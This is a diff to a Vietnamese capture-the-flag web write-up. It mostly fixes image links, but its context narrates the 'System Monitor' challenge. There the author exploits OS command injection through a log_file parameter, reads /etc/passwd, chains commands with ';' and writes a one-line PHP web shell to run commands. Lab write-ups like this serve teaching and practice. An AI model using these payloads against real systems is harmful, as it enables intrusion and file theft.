@@ -17,7 +17,7 @@
 - [Cookie Comic](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#cookie-comic)
 - [My Deploy](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#my-deploy)
 - [COMB](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#comb)
-- [System Monitor]()
+- [System Monitor](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#system-monitor)
 ### HTTP Request Content-Length
 Challenge:
 
@@ -456,11 +456,11 @@ Sau khi login, website sẽ hiển thị flag:
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image88.png?raw=true)
 ### System Monitor
 
-![img](89)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image89.png?raw=true)
 
 Truy cập vào trang web:
 
-![img](90)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image90.png?raw=true)
 
 Tôi đã thử click vào các tính năng trong mục `System Management` nhưng không có gì xảy ra. 
 
@@ -468,33 +468,33 @@ Tôi đã thử click vào các tính năng trong mục `System Management` như
 
 Thử click vào `Analyze`:
 
-![img](91)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image91.png?raw=true)
 
 => Như vậy, xác định được thử thách này là 1 dạng `OS command injection` và website sẽ lọc ra một số câu lệnh phổ biến. 
 
 Tôi thử chèn câu lệnh `/?id` vào URL, sau đó kiểm tra request thì thấy đường dẫn đến log_file mà website sẽ đọc log: `log_file=/var/log/nginx/access.log`.
 
-![img](92)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image92.png?raw=true)
 
 Tôi thử thay log_file thành `/etc/passwd`:
 
-![img](93)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image93.png?raw=true)
 
 => Thành công in ra `/etc/passwd`. Tiếp theo tôi thử `/etc/passwd;ls`:
 
-![img](94)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image94.png?raw=true)
 
 Câu lệnh `ls` không được thực hiện, tôi đã thử một số câu lệnh khác như `id`, `echo` nhưng không thành công, tuy nhiên lệnh `sleep 5` thì thành công. Có thể chèn payload nhưng chỉ áp dụng với 1 số lệnh nhất định. 
 
 Tiếp theo tôi thử chèn `echo "<?php system (\$_GET['cmd']); ?>" > shell.php` và gửi `POST` request `/shell.php/?cmd=ls`:
 
-![img](95)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image95.png?raw=true)
 
 => Thành công thực thi câu lệnh `ls`. Tiếp theo chỉ cần tìm và đọc file `flag.txt`:
 
-![img](96)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image96.png?raw=true)
 
-![img](97)
+![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image97.png?raw=true)
 
 
 
